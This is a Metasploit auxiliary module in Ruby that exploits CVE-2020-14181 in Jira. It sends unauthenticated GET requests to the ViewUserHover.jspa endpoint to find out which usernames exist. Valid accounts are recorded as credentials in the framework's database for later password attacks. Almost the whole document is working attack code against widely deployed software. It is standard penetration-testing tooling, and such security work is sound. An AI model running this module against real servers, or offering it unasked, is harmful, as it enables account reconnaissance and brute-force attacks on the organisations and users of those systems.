##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Jira Users Enumeration',
        'Description' => %q{
          This module exploits an information disclosure vulnerability that allows an
          unauthenticated user to enumerate users in the /ViewUserHover.jspa endpoint.
          This only affects Jira versions < 7.13.16, 8.0.0 <= version < 8.5.7, 8.6.0 <= version < 8.11.1
          Discovered by Mikhail Klyuchnikov @__mn1__
          This module has been tested on versions 8.4.1, 8.5.6, 8.10.1, 8.11.0
        },
        'Author' => [
          'Brian Halbach', # msf module author
          'Mikhail Klyuchnikov' # initial discovery and PoC
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://jira.atlassian.com/browse/JRASERVER-71560'],
          ['CVE', '2020-14181']
        ],
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => []
        },
        'DisclosureDate' => '2020-08-16'
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'Jira Path', '/']),
      ]
    )
    deregister_options('PASS_FILE', 'USERPASS_FILE', 'USER_AS_PASS', 'STOP_ON_SUCCESS', 'BLANK_PASSWORDS', 'DB_ALL_CREDS', 'DB_ALL_PASS', 'PASSWORD')
  end

  def base_uri
    @base_uri ||= normalize_uri("#{target_uri.path}/secure/ViewUserHover.jspa")
  end

  def do_user_enum(user)
    print_status("Checking user '#{user}'")
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => base_uri,
      'vars_get' => { 'username' => user },
      'headers' => { 'Connection' => 'Close' }
    )

    unless res
      print_error('No Response From Server')
      return :abort
    end

    if res.body.include?('User does not exist')
      print_bad("User '#{user}' does not exist")
    elsif res.body.include?('<a id="avatar-full-name-link"') # this works for 8.4.1 not sure about other versions
      connection_details = {
        module_fullname: fullname,
        username: user,
        workspace_id: myworkspace_id,
        status: Metasploit::Model::Login::Status::UNTRIED
      }.merge(service_details)
      create_credential_and_login(connection_details)

      print_good("User exists: '#{user}'")
      @users_found << user
    end
  end

  def run_host(_ip)
    @users_found = []

    print_status("Begin enumerating users at #{vhost}#{base_uri}")
    each_user_pass do |user, _pass|
      next if user.empty?

      do_user_enum(user)
    end

    if @users_found.empty?
      print_status("#{full_uri} - No users found.")
    else
      print_good("#{@users_found.length} Users found: #{@users_found.sort.join(', ')}")
    end
  end
end
